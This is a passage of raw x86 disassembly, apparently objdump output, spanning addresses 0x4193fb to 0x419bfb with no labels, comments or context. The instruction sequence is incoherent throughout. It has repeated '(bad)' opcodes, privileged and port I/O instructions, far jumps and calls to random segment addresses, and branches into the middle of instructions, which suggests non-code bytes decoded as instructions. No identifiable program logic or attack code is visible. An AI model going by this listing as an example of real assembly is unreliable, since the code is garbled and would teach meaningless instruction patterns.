  4193fb:	rol    DWORD PTR [esi+0x37],0x21
  4193ff:	push   esi
  419400:	cmp    DWORD PTR [ebx-0x33e3b55f],ebx
  419406:	ficomp DWORD PTR [ebp+0x4fe1457a]
  41940c:	in     al,0x88
  41940e:	push   ecx
  41940f:	push   ebx
  419410:	lds    ebp,FWORD PTR [ebp-0x2b83a284]
  419416:	mov    edx,0x33b1a1b3
  41941b:	mov    ebp,0xc77d8342
  419420:	xor    esi,esp
  419422:	loope  0x41944a
  419424:	mov    ecx,0x53ac4294
  419429:	sub    cl,0x2e
  41942c:	leave  
  41942d:	and    ebp,ebp
  41942f:	pop    ebx
  419430:	xchg   DWORD PTR [edx+0x1a],esi
  419433:	mov    eax,ds:0x15375d26
  419438:	shr    DWORD PTR [edi],1
  41943a:	call   0x71567e02
  41943f:	inc    edx
  419440:	jmp    0xe49a9725
  419445:	aam    0x62
  419447:	xchg   ebp,eax
  419448:	fcmovb st,st(0)
  41944a:	or     ah,cl
  41944c:	ds jge 0x419489
  41944f:	mov    edi,0x9487d10
  419454:	popf   
  419455:	dec    ebx
  419456:	fcomp  QWORD PTR [edx]
  419458:	jbe    0x419474
  41945a:	jmp    0x7225:0x2e198bda
  419461:	dec    esp
  419462:	imul   edi,DWORD PTR [esp+edx*4],0xe61bcf51
  419469:	imul   edx,DWORD PTR [eax+ebx*2-0x5a612740],0x54
  419471:	adc    al,0xa
  419473:	mov    WORD PTR [ebx-0x58],?
  419476:	sbb    BYTE PTR [esi+0x1c],dh
  419479:	sbb    dh,ah
  41947b:	loop   0x419475
  41947d:	ds jo  0x419415
  419480:	sbb    ebp,DWORD PTR [eax]
  419482:	ins    BYTE PTR es:[di],dx
  419484:	repnz fwait
  419486:	mov    ebx,0xf7e88dd2
  41948b:	xchg   BYTE PTR [ecx-0x77],ah
  41948e:	hlt    
  41948f:	jecxz  0x41941e
  419491:	add    al,0xb3
  419493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419494:	cs mov ebp,0x2c9e5ae0
  41949a:	in     al,0xa0
  41949c:	cwde   
  41949d:	or     al,0xda
  41949f:	(bad)  
  4194a0:	in     al,0xdd
  4194a2:	push   esi
  4194a3:	mov    ebx,0xad4748c9
  4194a8:	jmp    0xc3d352a0
  4194ad:	in     al,0xe1
  4194af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194b0:	jp     0x4194c9
  4194b2:	lods   eax,DWORD PTR ds:[esi]
  4194b3:	dec    ebp
  4194b4:	cmp    BYTE PTR [ebp+0x77dd520d],dh
  4194ba:	ret    0xde71
  4194bd:	inc    ebx
  4194be:	add    al,0x7f
  4194c0:	sub    al,0x36
  4194c2:	pop    ss
  4194c3:	push   0x16
  4194c5:	jle    0x4194a0
  4194c7:	retf   
  4194c8:	popa   
  4194c9:	pop    esi
  4194ca:	or     edx,DWORD PTR [edi]
  4194cc:	mov    ebx,0x808a24e5
  4194d1:	mov    esp,0xa3d77cd4
  4194d6:	aad    0x40
  4194d8:	das    
  4194d9:	js     0x41949f
  4194db:	pop    esi
  4194dc:	int    0x79
  4194de:	adc    eax,0x9275cce9
  4194e3:	add    DWORD PTR [edx],ecx
  4194e5:	add    eax,0x65b1de4b
  4194ea:	retf   0xe553
  4194ed:	mov    ds:0xd050ff9f,eax
  4194f2:	push   0x2f814de2
  4194f7:	mov    edx,0x7769805c
  4194fc:	or     DWORD PTR [edx-0x2efd4b16],eax
  419502:	test   BYTE PTR [ebp+edi*2+0xb],ch
  419506:	stos   BYTE PTR es:[edi],al
  419507:	jo     0x4194e0
  419509:	mov    ebx,0x1397aa74
  41950e:	std    
  41950f:	jno    0x4194da
  419511:	test   eax,0xea7b5802
  419516:	test   bh,bl
  419518:	lahf   
  419519:	sub    BYTE PTR [esi-0x3be09ae7],0x77
  419520:	ins    DWORD PTR es:[edi],dx
  419521:	(bad)  
  419522:	fist   WORD PTR ds:0xca93979
  419528:	rol    BYTE PTR [edx],0x56
  41952b:	jge    0x41953e
  41952d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41952e:	std    
  41952f:	in     eax,dx
  419530:	sbb    dl,BYTE PTR [ecx-0xd]
  419533:	jle    0x41953f
  419535:	fisttp QWORD PTR [edx-0x3a]
  419538:	std    
  419539:	and    al,0xe8
  41953b:	sbb    eax,0x9705a04
  419540:	adc    al,0xc8
  419542:	and    eax,0x8b1f8474
  419547:	mov    dh,0xed
  419549:	pop    esp
  41954a:	or     esp,0x6a
  41954d:	(bad)  
  41954e:	es mov esp,0x6045bc89
  419554:	pop    edx
  419555:	jge    0x419532
  419557:	(bad)  
  419558:	mov    bl,0x83
  41955a:	jno    0x4195a2
  41955c:	xchg   esp,eax
  41955d:	(bad)  
  41955e:	jnp    0x4194fe
  419560:	test   al,0x56
  419562:	call   0xb1e88ade
  419567:	push   ecx
  419568:	adc    eax,0xaa3da152
  41956d:	pop    esi
  41956e:	jno    0x4195eb
  419570:	inc    edx
  419571:	gs pop ds
  419573:	ins    BYTE PTR es:[edi],dx
  419574:	call   0xacde:0xe2100bce
  41957b:	(bad)  
  41957c:	cmc    
  41957d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41957e:	addr16 dec esi
  419580:	push   eax
  419581:	jno    0x4195fe
  419583:	sub    dl,BYTE PTR [esi]
  419585:	pop    ebx
  419586:	jnp    0x419589
  419588:	mov    cl,0x5
  41958a:	pop    esp
  41958b:	sahf   
  41958c:	mov    al,ds:0x67af585d
  419591:	test   BYTE PTR [esi-0x317af682],bh
  419597:	xlat   BYTE PTR ds:[ebx]
  419598:	fbld   TBYTE PTR ds:0xf25c085a
  41959e:	sbb    ebp,edi
  4195a0:	inc    edi
  4195a1:	adc    dl,BYTE PTR [eax-0x36ea6ad4]
  4195a7:	js     0x4195e8
  4195a9:	push   0xc1aca679
  4195ae:	retf   0x46d0
  4195b1:	test   eax,esi
  4195b3:	das    
  4195b4:	cli    
  4195b5:	lahf   
  4195b6:	push   edx
  4195b7:	inc    bl
  4195b9:	xchg   al,dh
  4195bb:	sbb    bl,BYTE PTR [esi]
  4195bd:	popa   
  4195be:	bound  esi,QWORD PTR [edi+0x46]
  4195c1:	enter  0xb1ff,0x29
  4195c5:	loope  0x4195c7
  4195c7:	mov    esp,0x155caeb8
  4195cc:	adc    bh,BYTE PTR [ebx-0x11]
  4195cf:	rcl    ch,0x5b
  4195d2:	sub    edx,edi
  4195d4:	outs   dx,DWORD PTR ds:[esi]
  4195d5:	loop   0x41964e
  4195d7:	imul   BYTE PTR [ecx+0x320fbd59]
  4195dd:	inc    eax
  4195de:	out    0xf8,al
  4195e0:	stos   BYTE PTR es:[edi],al
  4195e1:	add    DWORD PTR [ecx+0x74b7c80d],ebp
  4195e7:	(bad)  
  4195e8:	fcmovbe st,st(5)
  4195ea:	leave  
  4195eb:	imul   ecx,ebx,0xffffffba
  4195ee:	or     dh,BYTE PTR [ebp+ebx*8+0x7b]
  4195f2:	(bad)  
  4195f3:	punpcklwd mm1,DWORD PTR [eax+0x7f]
  4195f7:	cld    
  4195f8:	outs   dx,DWORD PTR ds:[esi]
  4195f9:	adc    bh,BYTE PTR [ebx+ecx*4]
  4195fc:	dec    edx
  4195fd:	lods   al,BYTE PTR ds:[esi]
  4195fe:	pop    edx
  4195ff:	cmp    DWORD PTR [edi+0x502b66a5],ebp
  419605:	and    WORD PTR [ebx],ax
  419608:	mov    bl,0xf8
  41960a:	sub    eax,0x843e31a3
  41960f:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  419611:	and    BYTE PTR [esi+0x72b8e678],0xdf
  419618:	xchg   ebp,eax
  419619:	jl     0x41968e
  41961b:	or     al,0x65
  41961d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41961e:	(bad)  
  419620:	jmp    0xcade:0xd86d394d
  419627:	mov    esp,0x5ac36ac3
  41962c:	jp     0x419639
  41962e:	push   ds
  41962f:	mov    ebp,0xe9957f9f
  419634:	jg     0x4195b9
  419636:	push   esi
  419637:	iret   
  419638:	push   cs
  419639:	ins    DWORD PTR es:[edi],dx
  41963a:	shl    DWORD PTR [eax],cl
  41963c:	xrelease mov DWORD PTR [eax-0x3588e98e],eax
  419643:	hlt    
  419644:	subps  xmm4,XMMWORD PTR [ecx]
  419647:	jns    0x419614
  419649:	ss (bad) 
  41964b:	dec    esp
  41964c:	pop    ss
  41964d:	and    ebx,esp
  41964f:	arpl   WORD PTR [esi+0x42],sp
  419652:	dec    esi
  419653:	mov    edi,0x685d6d46
  419658:	cmc    
  419659:	not    BYTE PTR [esi+0x7a]
  41965c:	dec    edi
  41965d:	push   ebp
  41965e:	ins    DWORD PTR es:[edi],dx
  41965f:	jge    0x4195e1
  419661:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419663:	das    
  419664:	ja     0x419623
  419666:	in     eax,0x94
  419668:	mov    ebx,0x2b19b877
  41966d:	lahf   
  41966e:	test   al,0xc3
  419670:	jbe    0x419655
  419672:	lds    esp,FWORD PTR [esi]
  419674:	ss or  esp,esi
  419677:	mov    cl,0x90
  419679:	imul   DWORD PTR [edx+eax*1]
  41967c:	test   eax,0x57339614
  419681:	test   eax,0xbdd3fdd8
  419686:	jecxz  0x4196fd
  419688:	ins    DWORD PTR es:[edi],dx
  419689:	inc    edi
  41968a:	popf   
  41968b:	call   0xb2c8:0x7cf98715
  419692:	jge    0x419660
  419694:	pop    ecx
  419695:	jl     0x41967c
  419697:	fwait
  419698:	dec    ebp
  419699:	pusha  
  41969a:	cdq    
  41969b:	test   BYTE PTR [eax-0x34a77763],cl
  4196a1:	in     eax,0xfc
  4196a3:	test   eax,0x503f0998
  4196a8:	test   eax,0xf90c172a
  4196ad:	add    ecx,DWORD PTR ds:0x1ae4df16
  4196b3:	dec    edi
  4196b4:	xchg   edi,eax
  4196b5:	pushf  
  4196b6:	pop    ss
  4196b7:	xchg   DWORD PTR [ebx-0x58d244fd],edi
  4196bd:	mov    dh,0xb
  4196bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196c0:	icebp  
  4196c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196c2:	push   esp
  4196c3:	cmp    esp,DWORD PTR cs:[esp+ebp*2+0x3f]
  4196c8:	aam    0xdf
  4196ca:	sti    
  4196cb:	and    al,0x47
  4196cd:	push   0xfcae287d
  4196d2:	out    0x65,eax
  4196d4:	shr    esi,1
  4196d6:	jle    0x4196d8
  4196d8:	add    ecx,ebp
  4196da:	push   0x70
  4196dc:	adc    eax,0xe416786e
  4196e1:	pop    ebp
  4196e2:	xchg   esi,eax
  4196e3:	lods   eax,DWORD PTR ds:[esi]
  4196e4:	inc    ebx
  4196e5:	dec    edx
  4196e6:	add    esi,edi
  4196e8:	scas   al,BYTE PTR es:[edi]
  4196e9:	pop    esp
  4196ea:	push   eax
  4196eb:	and    al,0xfe
  4196ed:	pop    es
  4196ee:	mov    bh,0x2
  4196f0:	xor    eax,0x89619676
  4196f5:	sub    BYTE PTR [eax+0x1ea912eb],ah
  4196fb:	adc    DWORD PTR [edx-0x37],0xffffff97
  4196ff:	sub    al,0x71
  419701:	sub    al,0x43
  419703:	push   ds
  419704:	pop    es
  419705:	ins    DWORD PTR es:[edi],dx
  419706:	cmc    
  419707:	not    ah
  419709:	sbb    al,0x23
  41970b:	and    ah,0x33
  41970e:	xchg   esi,eax
  41970f:	sub    ch,BYTE PTR [eax-0x709a04fb]
  419715:	cld    
  419716:	cli    
  419717:	mov    dl,0xd2
  419719:	adc    esp,edx
  41971b:	add    ebx,ecx
  41971d:	(bad)  [eax-0x61]
  419720:	dec    esi
  419721:	shr    BYTE PTR [ebx-0x16],cl
  419724:	int    0x22
  419726:	xchg   DWORD PTR [ecx-0x2f77c563],esp
  41972c:	jbe    0x4196da
  41972e:	cmp    DWORD PTR [edx],ecx
  419730:	retf   0xe5f4
  419733:	(bad)  
  419734:	or     eax,0x57c0656d
  419739:	jae    0x419723
  41973b:	adc    al,0xed
  41973d:	ss push eax
  41973f:	fild   DWORD PTR [esi-0x4c]
  419742:	sti    
  419743:	xchg   ebp,eax
  419744:	pop    es
  419745:	xchg   BYTE PTR [eax],dl
  419747:	mov    ebx,0x51f6a983
  41974c:	push   eax
  41974d:	mov    ds,WORD PTR [edx+eax*4-0x7a]
  419751:	sbb    eax,0x9b4f6774
  419756:	lea    esp,[esi]
  419758:	cld    
  419759:	nop
  41975a:	int3   
  41975b:	retf   0x812a
  41975e:	es out dx,eax
  419760:	jnp    0x419788
  419762:	mov    esi,DWORD PTR [edx+0xa]
  419765:	in     eax,dx
  419766:	stos   BYTE PTR es:[edi],al
  419767:	ins    BYTE PTR es:[edi],dx
  419768:	adc    al,0x42
  41976a:	ret    0xb5ca
  41976d:	adc    WORD PTR [ecx-0x4d],di
  419771:	jle    0x4196f3
  419773:	outs   dx,DWORD PTR ds:[esi]
  419774:	out    dx,al
  419775:	xor    DWORD PTR [edx+0x65],eax
  419778:	jp     0x41972e
  41977a:	mov    edx,0x511e93f4
  41977f:	push   0x3b32c5dd
  419784:	cmp    esi,DWORD PTR [eax+0x65b784]
  41978a:	sti    
  41978b:	inc    eax
  41978c:	jmp    0xd314f053
  419791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419792:	mov    esp,0xbe7619ca
  419797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419798:	sar    BYTE PTR [ebx],cl
  41979a:	call   0x1538f34
  41979f:	popf   
  4197a0:	hlt    
  4197a1:	pop    es
  4197a2:	(bad)  
  4197a3:	sub    eax,0xedbb119
  4197a8:	mov    ah,0x95
  4197aa:	mov    dh,bl
  4197ac:	fistp  WORD PTR ss:[edi-0x45d24403]
  4197b3:	test   BYTE PTR [ebx],0x5a
  4197b6:	in     eax,0x67
  4197b8:	add    esi,ebx
  4197ba:	ror    DWORD PTR [ebx-0x60],cl
  4197bd:	add    BYTE PTR ds:0x50ab0483,bh
  4197c3:	and    ah,BYTE PTR [esi-0x45d8ead3]
  4197c9:	push   0xfffffff0
  4197cb:	repz mov dl,0x94
  4197ce:	adc    edx,DWORD PTR [edi-0xe]
  4197d1:	arpl   bx,si
  4197d3:	or     eax,0xa01a4181
  4197d8:	jmp    0x1660:0xcc58b019
  4197df:	clc    
  4197e0:	call   0xb26:0xa9c70fcc
  4197e7:	pcmpgtw mm3,QWORD PTR [edx-0x2a]
  4197eb:	and    bl,BYTE PTR [edi-0x4d80a668]
  4197f1:	cwde   
  4197f2:	leave  
  4197f3:	inc    eax
  4197f4:	mov    esi,0x15ffda6
  4197f9:	jl     0x41982d
  4197fb:	inc    ebp
  4197fc:	sub    esp,ebp
  4197fe:	cmp    BYTE PTR [edx],0xa7
  419801:	xor    BYTE PTR [edi-0x67a8b761],ah
  419807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419808:	cld    
  419809:	mov    ah,dl
  41980b:	pop    ebp
  41980c:	aam    0x5f
  41980e:	and    eax,DWORD PTR [edi+0x42488370]
  419814:	xor    eax,0xffa6a283
  419819:	pusha  
  41981a:	xor    BYTE PTR [edx-0x17],al
  41981d:	icebp  
  41981e:	sahf   
  41981f:	repnz dec edi
  419821:	retf   
  419822:	(bad)  
  419823:	and    eax,0x82d3a3a4
  419828:	xchg   ebx,eax
  419829:	xor    DWORD PTR [eax],edi
  41982b:	cdq    
  41982c:	aad    0xab
  41982e:	and    al,0x43
  419830:	std    
  419831:	gs inc esp
  419833:	jge    0x4197ba
  419835:	sbb    eax,0x334c3a33
  41983a:	loop   0x419845
  41983c:	adc    eax,DWORD PTR ds:0x803337dc
  419842:	jb     0x4197f8
  419844:	xor    DWORD PTR [edx],eax
  419846:	rol    BYTE PTR [ebx],1
  419848:	enter  0x162b,0x26
  41984c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41984d:	sub    eax,0xf15c13de
  419852:	pop    eax
  419853:	sbb    al,BYTE PTR [esi-0x4d]
  419856:	popa   
  419857:	ss jmp 0x4197f3
  41985a:	xchg   DWORD PTR [esi+0xc],esi
  41985d:	mov    ebx,0x69f269ef
  419862:	push   ss
  419863:	or     al,0xc8
  419865:	xor    edi,edi
  419867:	push   ds
  419868:	(bad)  
  419869:	repz push esp
  41986b:	jno    0x419827
  41986d:	and    cl,0x70
  419870:	aad    0x9c
  419872:	cs pop edi
  419874:	push   ss
  419875:	out    dx,al
  419876:	cdq    
  419877:	pop    ebx
  419878:	cmp    BYTE PTR [edi+0x35],al
  41987b:	popa   
  41987c:	neg    DWORD PTR [edx+0x6d5d910d]
  419882:	jns    0x4198c4
  419884:	ficomp DWORD PTR [ecx-0x4418fa67]
  41988a:	and    eax,DWORD PTR [ebx-0x32]
  41988d:	jo     0x41987e
  41988f:	and    DWORD PTR [ecx+eax*8],0x2b72c20e
  419896:	adc    DWORD PTR [edx+0x10b8a54],edx
  41989c:	and    al,0x84
  41989e:	cmp    bh,BYTE PTR [ebx+0x56]
  4198a1:	stos   BYTE PTR es:[edi],al
  4198a2:	(bad)  
  4198a3:	jmp    0xa7c3d7f5
  4198a8:	hlt    
  4198a9:	xchg   ecx,eax
  4198aa:	test   BYTE PTR [ebx+0x22b17742],bl
  4198b0:	push   0xffffff9d
  4198b2:	lods   eax,DWORD PTR ds:[esi]
  4198b3:	(bad)  
  4198b5:	in     al,0x4e
  4198b7:	pop    esi
  4198b8:	jmp    0xaaee:0xcabccb12
  4198bf:	inc    ecx
  4198c0:	adc    eax,0x60ff7d1c
  4198c5:	popf   
  4198c6:	imul   ecx,ebx,0xa
  4198c9:	or     DWORD PTR [esi-0x17],0x6cd6af3e
  4198d0:	pop    edx
  4198d1:	push   ss
  4198d2:	shr    BYTE PTR [ebx-0x4e],cl
  4198d5:	jae    0x419925
  4198d7:	xchg   ebx,eax
  4198d8:	stos   BYTE PTR es:[edi],al
  4198d9:	lock popf 
  4198db:	add    al,0xb9
  4198dd:	xchg   edx,eax
  4198de:	js     0x419906
  4198e0:	add    eax,0x5e9ebd52
  4198e5:	xchg   ecx,eax
  4198e6:	mov    ds,WORD PTR [esi+0x15]
  4198e9:	nop
  4198ea:	out    0x24,al
  4198ec:	clc    
  4198ed:	jge    0x419923
  4198ef:	push   edx
  4198f0:	cmp    esi,ebx
  4198f2:	jge    0x419942
  4198f4:	iret   
  4198f5:	ins    DWORD PTR es:[edi],dx
  4198f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198f7:	bnd jle 0x4198f3
  4198fa:	pop    edx
  4198fb:	stc    
  4198fc:	fstp   st(4)
  4198fe:	in     eax,0x3a
  419900:	mov    ch,0x18
  419902:	int    0xcf
  419904:	(bad)  
  419905:	fistp  DWORD PTR ds:0x71567867
  41990b:	mov    ecx,0x84ee4de2
  419910:	outs   dx,BYTE PTR ds:[esi]
  419911:	stc    
  419912:	dec    ebp
  419913:	ins    DWORD PTR es:[edi],dx
  419914:	inc    esp
  419915:	stc    
  419916:	jae    0x419981
  419918:	out    dx,al
  419919:	aad    0x6b
  41991b:	pop    es
  41991c:	repz xor ch,ch
  41991f:	rcl    eax,0x9d
  419922:	dec    DWORD PTR [esi+0x6c8d194b]
  419928:	sbb    WORD PTR [edi],bx
  41992b:	js     0x41998b
  41992d:	scas   eax,DWORD PTR es:[di]
  41992f:	test   ebx,edi
  419931:	jns    0x419981
  419933:	jno    0x4198df
  419935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419936:	mov    eax,ds:0xeb5646bb
  41993b:	mov    ah,0x4e
  41993d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41993e:	das    
  41993f:	test   BYTE PTR [ebx+0xc],0xc0
  419943:	cmp    BYTE PTR [esi+0x2afae449],0xa3
  41994a:	mov    bl,0x1d
  41994c:	pop    edi
  41994d:	sbb    ah,BYTE PTR [ebp+0x7d]
  419950:	lods   al,BYTE PTR ds:[esi]
  419951:	sbb    cl,BYTE PTR [eax+0x2a]
  419954:	call   0x99eb:0x5c6bf12d
  41995b:	addr16 pusha 
  41995d:	pop    ebx
  41995e:	loope  0x419918
  419960:	mov    bh,0x70
  419962:	pop    es
  419963:	mov    dl,0x7c
  419965:	dec    ebx
  419966:	call   0x49e692d7
  41996b:	jbe    0x41998b
  41996d:	push   es
  41996e:	out    0xd4,eax
  419970:	mov    dh,0x73
  419972:	test   eax,0x65f896d7
  419977:	fcom   QWORD PTR [esp+ecx*4+0xd94d92b]
  41997e:	fs stc 
  419980:	mov    dh,0x5a
  419982:	repnz loop 0x4199d4
  419985:	sbb    DWORD PTR [eax],0x7b
  419988:	pop    es
  419989:	jbe    0x4199b2
  41998b:	push   esi
  41998c:	jmp    0x9edd:0xd3cd70dd
  419993:	dec    esp
  419994:	push   0xb92a172f
  419999:	xor    eax,0xc065ad54
  41999e:	or     eax,0x75b125ce
  4199a3:	imul   ah
  4199a5:	xor    ecx,edi
  4199a7:	call   0xd343e888
  4199ac:	js     0x4199e1
  4199ae:	std    
  4199af:	adc    eax,0x9f9a47fd
  4199b4:	xor    eax,0xc2b4dedd
  4199b9:	std    
  4199ba:	lahf   
  4199bb:	mov    bh,0x82
  4199bd:	cdq    
  4199be:	dec    edi
  4199bf:	push   ds
  4199c0:	mov    dl,bh
  4199c2:	pop    eax
  4199c3:	cmp    BYTE PTR cs:[eax+0xaa4f49b],al
  4199ca:	scas   eax,DWORD PTR es:[edi]
  4199cb:	(bad)
  4199cf:	dec    ecx
  4199d0:	and    cl,BYTE PTR [edi]
  4199d2:	and    esp,DWORD PTR [ebp+ebp*4-0x37]
  4199d6:	xchg   esp,eax
  4199d7:	adc    BYTE PTR [eax+0x35],dl
  4199da:	mov    dl,0x2f
  4199dc:	mov    cl,0xe0
  4199de:	cmp    DWORD PTR [ebx],eax
  4199e0:	sub    ebx,DWORD PTR [eax]
  4199e2:	cmp    DWORD PTR [edi-0x37fc0b8a],ebx
  4199e8:	retf   
  4199e9:	ins    DWORD PTR es:[edi],dx
  4199ea:	aam    0x60
  4199ec:	inc    ebp
  4199ed:	inc    edi
  4199ee:	arpl   WORD PTR [ebp-0x7a],dx
  4199f1:	jns    0x419a0a
  4199f3:	sub    al,0xa8
  4199f5:	dec    edi
  4199f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199f7:	or     esi,esp
  4199f9:	icebp  
  4199fa:	sahf   
  4199fb:	xchg   ebx,eax
  4199fc:	mov    edx,0xfae11fe7
  419a01:	es push cs
  419a03:	and    DWORD PTR [esi],eax
  419a05:	mov    esp,0x4e863d99
  419a0a:	sahf   
  419a0b:	adc    DWORD PTR [esi-0x5ff56933],ebx
  419a11:	mov    edi,0xe11647d5
  419a16:	fwait
  419a17:	adc    al,0x85
  419a19:	clc    
  419a1a:	xor    dl,cl
  419a1c:	add    eax,0x10df1955
  419a21:	mov    bl,0xee
  419a23:	shr    BYTE PTR [ebp+ecx*2-0x6b],1
  419a27:	aam    0x8f
  419a29:	out    dx,eax
  419a2a:	in     eax,dx
  419a2b:	icebp  
  419a2c:	or     ch,al
  419a2e:	test   BYTE PTR [bx],cl
  419a31:	sbb    al,0x6b
  419a34:	les    edi,FWORD PTR [esp+eax*2+0x20]
  419a38:	mov    ecx,0x40814f7d
  419a3d:	and    al,0xc5
  419a3f:	sbb    eax,0x26800782
  419a44:	xchg   BYTE PTR [esi-0x68df38ca],cl
  419a4a:	and    BYTE PTR [ebx+0x37],bl
  419a4d:	inc    ebp
  419a4e:	iret   
  419a4f:	ins    BYTE PTR es:[edi],dx
  419a50:	je     0x419a22
  419a52:	cli    
  419a53:	test   DWORD PTR [ecx+0x34562d4e],ecx
  419a59:	cdq    
  419a5a:	(bad)  
  419a5b:	pop    esi
  419a5c:	jmp    0x8ca40dde
  419a61:	clc    
  419a62:	fisttp WORD PTR [ebp+ebx*1+0x4f3179ea]
  419a69:	xchg   ebx,eax
  419a6a:	xor    esi,esp
  419a6c:	mov    edi,0xe81badfe
  419a71:	sbb    eax,0xcf0130ad
  419a76:	sub    bl,BYTE PTR ds:0x803745b
  419a7c:	fst    DWORD PTR [eax]
  419a7e:	mov    edi,DWORD PTR ds:0x390b1189
  419a84:	push   0x2d
  419a86:	mov    ebp,0xe63bb1d2
  419a8b:	jb     0x419aa5
  419a8d:	mov    esp,0x952b558f
  419a92:	or     eax,0xa4146e54
  419a97:	pop    edi
  419a98:	fld    TBYTE PTR [esi]
  419a9a:	push   edx
  419a9b:	ret    0x15a3
  419a9e:	inc    ecx
  419a9f:	sbb    esi,eax
  419aa1:	add    ecx,DWORD PTR [ecx+0x360c8160]
  419aa7:	xor    eax,0x3a70c8a0
  419aac:	repz jge 0x419b28
  419aaf:	cmp    eax,0x6b4e21a7
  419ab4:	ins    DWORD PTR es:[edi],dx
  419ab5:	xchg   ebx,eax
  419ab6:	push   cs
  419ab7:	test   DWORD PTR [ebx+0x42],ecx
  419aba:	aaa    
  419abb:	mov    bh,BYTE PTR [ebx+0x4f51dfb4]
  419ac1:	xchg   edx,eax
  419ac2:	mov    ebx,0x45732d20
  419ac7:	(bad)  
  419ac8:	pusha  
  419ac9:	ins    BYTE PTR es:[edi],dx
  419aca:	sbb    al,0xaa
  419acc:	icebp  
  419acd:	test   al,0xcd
  419acf:	sbb    DWORD PTR [ecx],0x38
  419ad2:	cwde   
  419ad3:	test   eax,0xed7fbd0
  419ad8:	gs in  al,dx
  419ada:	xchg   edi,eax
  419adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419adc:	aaa    
  419add:	popa   
  419ade:	push   cs
  419adf:	call   0xb2e785d0
  419ae4:	(bad)  
  419ae5:	cmp    al,0x64
  419ae7:	jb     0x419af8
  419ae9:	sub    edx,ebx
  419aeb:	out    0xf4,al
  419aed:	push   esi
  419aee:	cli    
  419aef:	cdq    
  419af0:	icebp  
  419af1:	sub    esp,DWORD PTR [esi+0x3c0d8300]
  419af7:	mov    es,WORD PTR [eax+0x31f33d5c]
  419afd:	mov    ah,0xeb
  419aff:	retf   0x20d2
  419b02:	dec    esp
  419b03:	sahf   
  419b04:	out    dx,al
  419b05:	push   cs
  419b06:	inc    sp
  419b08:	dec    esp
  419b09:	and    eax,0xb4b998a9
  419b0e:	jne    0x419b4d
  419b10:	mov    ecx,esp
  419b12:	jmp    0x419b1f
  419b14:	jne    0x419ab1
  419b16:	jle    0x419aab
  419b18:	mov    dl,0x77
  419b1a:	mov    al,0x3f
  419b1c:	(bad)  
  419b1d:	(bad)  
  419b1e:	cmp    eax,0x8c13dbb9
  419b23:	fcomp  DWORD PTR [edi+ebp*1+0x71]
  419b27:	fild   DWORD PTR [esi]
  419b29:	dec    ebx
  419b2a:	push   0xffffffec
  419b2c:	fldcw  WORD PTR [edx+0x75ace484]
  419b32:	jmp    FWORD PTR [ebp-0x6fb53b05]
  419b38:	loop   0x419b2c
  419b3a:	stc    
  419b3b:	(bad)  
  419b3c:	cmp    al,0x7
  419b3e:	xchg   esi,eax
  419b3f:	mov    ecx,0xefb63f2b
  419b45:	push   edi
  419b46:	hlt    
  419b47:	in     eax,dx
  419b48:	xchg   esi,eax
  419b49:	mov    cl,bl
  419b4b:	inc    ebx
  419b4c:	push   cs
  419b4d:	dec    esp
  419b4e:	cmp    BYTE PTR [ebx-0x22],0xea
  419b52:	dec    esi
  419b53:	dec    esp
  419b54:	jg     0x419bc1
  419b56:	jmp    0xaa9a:0x4754c8b6
  419b5d:	addr16 xor al,0xf4
  419b60:	fwait
  419b61:	je     0x419ba3
  419b63:	test   al,0x18
  419b66:	fwait
  419b67:	jge    0x419be2
  419b69:	mov    edi,DWORD PTR [ecx-0x7fafa353]
  419b6f:	repz aas 
  419b71:	es std 
  419b73:	mov    dl,0x22
  419b75:	in     eax,dx
  419b76:	fdivr  QWORD PTR ds:0x5bf8297e
  419b7c:	pop    esp
  419b7d:	sbb    eax,0x4efbeb7f
  419b82:	xor    BYTE PTR [edi+0x2d767a39],0x93
  419b89:	(bad)  
  419b8b:	loop   0x419bdf
  419b8d:	xor    DWORD PTR gs:[edx-0x3c],edi
  419b91:	test   al,0xb8
  419b93:	mov    ebp,0x564195b7
  419b98:	stos   DWORD PTR es:[edi],eax
  419b99:	gs cdq 
  419b9b:	and    eax,0x1c4335ff
  419ba0:	cld    
  419ba1:	jo     0x419bdd
  419ba3:	xchg   edx,eax
  419ba4:	mov    ds:0xe94fabc,eax
  419ba9:	(bad)  
  419baa:	cwde   
  419bab:	call   0x99c0:0x6eebf4e7
  419bb2:	pusha  
  419bb3:	rcr    bl,cl
  419bb5:	push   es
  419bb6:	into   
  419bb7:	pop    eax
  419bb8:	sbb    eax,0x3c9d6051
  419bbd:	pop    ebp
  419bbe:	or     ebx,esp
  419bc0:	clc    
  419bc1:	xchg   ecx,eax
  419bc2:	jmp    0x419bf0
  419bc4:	xchg   DWORD PTR [ecx+0x22],esp
  419bc7:	(bad)  
  419bc9:	mov    ecx,0x1b01133
  419bce:	(bad)
  419bd1:	xlat   BYTE PTR ds:[ebx]
  419bd2:	inc    eax
  419bd3:	out    dx,al
  419bd4:	stos   DWORD PTR es:[edi],eax
  419bd5:	in     al,0x6d
  419bd7:	mov    DWORD PTR [ebx+0x53616687],edi
  419bdd:	push   cs
  419bde:	vxorpd ymm2,ymm2,YMMWORD PTR [esi-0x7f081c19]
  419be6:	mov    eax,ebp
  419be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419be9:	sahf   
  419bea:	out    0xcc,eax
  419bec:	loopne 0x419c56
  419bee:	jmp    0xc1ae:0xb9509bf7
  419bf5:	int    0xe7
  419bf7:	mov    dl,0x49
  419bf9:	idiv   ch
  419bfb:	push   0x58cce96e
